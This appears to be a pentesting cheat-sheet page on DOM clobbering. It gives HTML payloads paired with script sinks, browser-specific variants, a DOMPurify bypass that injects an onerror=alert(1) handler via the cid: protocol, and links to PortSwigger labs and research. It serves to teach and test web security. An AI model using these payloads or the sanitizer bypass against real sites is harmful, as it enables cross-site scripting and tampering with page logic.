# DOM Clobbering

> DOM Clobbering is a technique where global variables can be overwritten or "clobbered" by naming HTML elements with certain IDs or names. This can cause unexpected behavior in scripts and potentially lead to security vulnerabilities.

## Summary

- [Tools](#tools)
- [Methodology](#methodology)
- [Lab](#lab)
- [References](#references)


## Tools

- [SoheilKhodayari/DOMClobbering](https://domclob.xyz/domc_markups/list) - Comprehensive List of DOM Clobbering Payloads for Mobile and Desktop Web Browsers
- [yeswehack/Dom-Explorer](https://github.com/yeswehack/Dom-Explorer) - A web-based tool designed for testing various HTML parsers and sanitizers.
- [yeswehack/Dom-Explorer Live](https://yeswehack.github.io/Dom-Explorer/dom-explorer#eyJpbnB1dCI6IiIsInBpcGVsaW5lcyI6W3siaWQiOiJ0ZGpvZjYwNSIsIm5hbWUiOiJEb20gVHJlZSIsInBpcGVzIjpbeyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJhYjU1anN2YyIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ==) - Reveal how browsers parse HTML and find mutated XSS vulnerabilities


## Methodology

Exploitation requires any kind of `HTML injection` in the page.

* Clobbering `x.y.value`
    ```html
    // Payload
    <form id=x><output id=y>I've been clobbered</output>

    // Sink
    <script>alert(x.y.value);</script>
    ```

* Clobbering `x.y` using ID and name attributes together to form a DOM collection
    ```html
    // Payload
    <a id=x><a id=x name=y href="Clobbered">

    // Sink
    <script>alert(x.y)</script>
    ```

* Clobbering `x.y.z` - 3 levels deep
    ```html
    // Payload
    <form id=x name=y><input id=z></form>
    <form id=x></form>

    // Sink
    <script>alert(x.y.z)</script>
    ```

* Clobbering `a.b.c.d` - more than 3 levels
    ```html
    // Payload
    <iframe name=a srcdoc="
    <iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
    <style>@import '//portswigger.net';</style>

    // Sink
    <script>alert(a.b.c.d)</script>
    ```

* Clobbering `forEach` (Chrome only)
    ```html
    // Payload
    <form id=x>
    <input id=y name=z>
    <input id=y>
    </form>

    // Sink
    <script>x.y.forEach(element=>alert(element))</script>
    ```

* Clobbering `document.getElementById()` using `<html>` or `<body>` tag with the same `id` attribute
    ```html
    // Payloads
    <html id="cdnDomain">clobbered</html>
    <svg><body id=cdnDomain>clobbered</body></svg>


    // Sink 
    <script>
    alert(document.getElementById('cdnDomain').innerText);//clobbbered
    </script>
    ```

* Clobbering `x.username`
    ```html
    // Payload
    <a id=x href="ftp:Clobbered-username:Clobbered-Password@a">

    // Sink
    <script>
    alert(x.username)//Clobbered-username
    alert(x.password)//Clobbered-password
    </script>
    ```

* Clobbering (Firefox only)
    ```html
    // Payload
    <base href=a:abc><a id=x href="Firefox<>">

    // Sink
    <script>
    alert(x)//Firefox<>
    </script>
    ```

* Clobbering (Chrome only)
    ```html
    // Payload
    <base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>

    // Sink
    <script>
    alert(x.xyz)//a://Clobbered<>
    </script>
    ```


## Tricks

* DomPurify allows the protocol `cid:`, which doesn't encode double quote (`"`): `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`


## Lab

- [PortSwigger - Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
- [PortSwigger - Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
- [PortSwigger - DOM clobbering test case protected by CSP](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/)


## References

- [Bypassing CSP via DOM clobbering - Gareth Heyes - 05 June 2023](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
- [DOM Clobbering - HackTricks - January 27, 2023](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
- [DOM Clobbering - PortSwigger - September 25, 2020](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [DOM Clobbering strikes back - Gareth Heyes - 06 February 2020](https://portswigger.net/research/dom-clobbering-strikes-back)
- [Hijacking service workers via DOM Clobbering - Gareth Heyes - 29 November 2022](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)